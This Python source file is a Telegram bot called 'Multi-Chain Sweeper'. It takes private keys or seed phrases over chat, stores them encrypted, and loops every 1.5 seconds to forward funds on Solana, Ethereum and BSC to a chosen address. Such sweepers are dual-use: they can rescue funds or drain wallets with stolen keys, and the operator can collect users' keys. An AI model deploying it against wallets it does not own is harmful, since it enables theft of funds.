from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from threading import Thread
from time import sleep
import logging
import json
import os

# Encryption
from cryptography.fernet import Fernet

# Blockchain Handlers
from chains import solana, ethereum, bsc
from config import TELEGRAM_BOT_TOKEN

# Flask
app = Flask(__name__)

# Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ---------------- CONFIG ----------------

DATA_FILE = "wallets.json"
SECRET_KEY = os.getenv("SECRET_KEY")

if not SECRET_KEY:
    raise Exception("Set SECRET_KEY in environment")

cipher = Fernet(SECRET_KEY.encode())

# ---------------- STORAGE ----------------

data_store = {}

def encrypt(data: str) -> str:
    return cipher.encrypt(data.encode()).decode()

def decrypt(data: str) -> str:
    return cipher.decrypt(data.encode()).decode()

def load_data():
    global data_store
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            data_store = json.load(f)
            data_store = {int(k): v for k, v in data_store.items()}
        print("✅ Data loaded")

def save_data():
    with open(DATA_FILE, "w") as f:
        json.dump(data_store, f)

# ---------------- FLASK ----------------

@app.route("/")
def ping():
    return "Bot is alive!"

# ---------------- COMMANDS ----------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 Multi-Chain Sweeper\n\n"
        "/setwallet <chain> <private_key OR seed phrase> <destination>\n"
        "/getinfo\n"
        "/removewallet"
    )

async def setwallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 3:
        await update.message.reply_text("Usage: /setwallet <chain> <secret> <destination>")
        return

    chain = context.args[0].lower()
    destination = context.args[-1]
    secret_input = " ".join(context.args[1:-1])

    if chain not in ["solana", "ethereum", "bsc"]:
        await update.message.reply_text("Supported: solana, ethereum, bsc")
        return

    wallet_type = "seed" if " " in secret_input else "private_key"

    user_id = update.effective_user.id

    wallet = {
        "chain": chain,
        "type": wallet_type,
        "secret": encrypt(secret_input),
        "destination": destination
    }

    data_store.setdefault(user_id, []).append(wallet)
    save_data()

    await update.message.reply_text(f"✅ Wallet added ({chain.upper()} - {wallet_type})")

async def getinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id not in data_store:
        await update.message.reply_text("No wallets set.")
        return

    msg = "📂 Wallets:\n\n"

    for i, w in enumerate(data_store[user_id]):
        msg += f"{i+1}. {w['chain'].upper()} ({w['type']})\n"
        msg += f"   📥 {w['destination']}\n\n"

    await update.message.reply_text(msg)

async def removewallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id not in data_store or not data_store[user_id]:
        await update.message.reply_text("No wallets.")
        return

    removed = data_store[user_id].pop()
    save_data()

    await update.message.reply_text(f"🗑 Removed {removed['chain'].upper()}")

# ---------------- SWEEPER ----------------

def monitor():
    logger.info("🚀 Sweeper started")

    while True:
        for user_id, wallets in data_store.items():
            for w in wallets:
                try:
                    secret = decrypt(w["secret"])

                    if w["chain"] == "solana":
                        solana.forward(secret, w["destination"], user_id)

                    elif w["chain"] == "ethereum":
                        ethereum.forward(secret, w["destination"], user_id)

                    elif w["chain"] == "bsc":
                        bsc.forward(secret, w["destination"], user_id)

                except Exception as e:
                    logger.error(f"{user_id} error: {e}")

        sleep(1.5)

# ---------------- BOT ----------------

def run_bot():
    app_bot = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("setwallet", setwallet))
    app_bot.add_handler(CommandHandler("getinfo", getinfo))
    app_bot.add_handler(CommandHandler("removewallet", removewallet))

    Thread(target=monitor, daemon=True).start()

    logger.info("🤖 Bot running...")
    app_bot.run_polling()

# ---------------- MAIN ----------------

if __name__ == "__main__":
    load_data()

    Thread(target=run_bot, daemon=True).start()

    app.run(host="0.0.0.0", port=5000)